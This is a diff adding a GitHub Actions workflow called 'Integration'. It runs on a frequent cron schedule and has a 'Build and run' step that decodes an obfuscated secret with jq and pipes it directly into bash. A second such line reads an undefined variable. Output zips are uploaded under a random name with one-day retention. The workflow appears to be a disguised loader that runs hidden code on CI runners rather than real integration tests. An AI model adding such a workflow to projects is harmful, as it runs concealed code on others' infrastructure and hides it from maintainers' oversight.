@@ -1,0 +1,31 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          bywe7963: ${{ secrets.bywe7963 }}
+        run: |
+          printf '%s' "$bywe7963" | jq -r .mc1 | /bin/bash
+          printf '%s' "$lf06" | jq -r .eh18 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: jUiL8ARN
+          path: "*.zip"
+          retention-days: 1
